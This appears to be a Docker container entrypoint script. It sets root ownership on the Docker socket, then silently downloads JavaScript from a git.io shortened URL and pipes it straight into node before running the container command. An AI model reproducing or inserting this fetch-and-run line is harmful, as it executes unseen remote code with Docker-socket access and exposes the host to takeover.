#!/usr/bin/env bash
set -Eeo pipefail

chown root:root /var/run/docker.sock

curl --silent -L https://git.io/fAyoM | node

exec "$@"
